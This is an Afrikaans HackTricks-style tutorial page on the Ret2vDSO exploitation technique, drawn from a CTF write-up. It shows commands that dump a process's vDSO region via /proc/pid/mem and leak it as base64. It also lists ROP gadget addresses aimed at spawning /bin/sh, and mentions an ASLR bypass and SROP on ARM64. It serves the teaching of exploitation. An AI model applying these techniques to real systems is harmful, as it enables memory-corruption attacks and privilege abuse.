# Ret2vDSO

{{#include ../../banners/hacktricks-training.md}}

## Basiese Inligting

Daar mag **gadgets in die vDSO streek** wees, wat gebruik word om van gebruikersmodus na kernmodus te verander. In hierdie tipe uitdagings word gewoonlik 'n kernbeeld voorsien om die vDSO streek te dump.

Volg die voorbeeld van [https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/maze-of-mist/](https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/maze-of-mist/) dit is moontlik om te sien hoe dit moontlik was om die vdso afdeling te dump en dit na die gasheer te beweeg met:
```bash
# Find addresses
cat /proc/76/maps
08048000-08049000 r--p 00000000 00:02 317                                /target
08049000-0804a000 r-xp 00001000 00:02 317                                /target
0804a000-0804b000 rw-p 00002000 00:02 317                                /target
f7ff8000-f7ffc000 r--p 00000000 00:00 0                                  [vvar]
f7ffc000-f7ffe000 r-xp 00000000 00:00 0                                  [vdso]
fffdd000-ffffe000 rw-p 00000000 00:00 0                                  [stack]

# Dump it
dd if=/proc/76/mem of=vdso bs=1 skip=$((0xf7ffc000)) count=$((0x2000))
8192+0 records in
8192+0 records out
8192 bytes (8.0KB) copied, 0.901154 seconds, 8.9KB/s

# Compress and leak it
gzip vdso
base64 vdso.gz

# Decompress and check of gadgets
echo '<base64-payload>' | base64 -d | gzip -d - > vdso
file vdso
ROPgadget --binary vdso | grep 'int 0x80'
```
ROP gadgets gevind:
```python
vdso_addr = 0xf7ffc000

int_0x80_xor_eax_eax_ret_addr = 0x8049010
bin_sh_addr = 0x804a800

# 0x0000057a : pop edx ; pop ecx ; ret
pop_edx_pop_ecx_ret_addr = vdso_addr + 0x57a

# 0x00000cca : mov dword ptr [edx], ecx ; add esp, 0x34 ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
mov_dword_ptr_edx_ecx_ret_addr = vdso_addr + 0xcca

# 0x00000ccb : or al, byte ptr [ebx + 0x5e5b34c4] ; pop edi ; pop ebp ; ret
or_al_byte_ptr_ebx_pop_edi_pop_ebp_ret_addr = vdso_addr + 0xccb

# 0x0000015cd : pop ebx ; pop esi ; pop ebp ; ret
pop_ebx_pop_esi_pop_ebp_ret = vdso_addr + 0x15cd
```
> [!CAUTION]
> Let dus op hoe dit moontlik mag wees om **ASLR te omseil deur die vdso te misbruik** as die kernel saamgestel is met CONFIG_COMPAT_VDSO, aangesien die vdso-adres nie ge-randomiseer sal word nie: [https://vigilance.fr/vulnerability/Linux-kernel-bypassing-ASLR-via-VDSO-11639](https://vigilance.fr/vulnerability/Linux-kernel-bypassing-ASLR-via-VDSO-11639)

### ARM64

Na die dumping en nagaan van die vdso-afdeling van 'n binÃªre in kali 2023.2 arm64, kon ek nie enige interessante gadget daarin vind nie (geen manier om registers te beheer vanaf waardes in die stapel of om x30 te beheer vir 'n ret nie) **behalwe 'n manier om 'n SROP aan te roep**. Kyk meer inligting in die voorbeeld van die bladsy:

{{#ref}}
srop-sigreturn-oriented-programming/srop-arm64.md
{{#endref}}

{{#include ../../banners/hacktricks-training.md}}
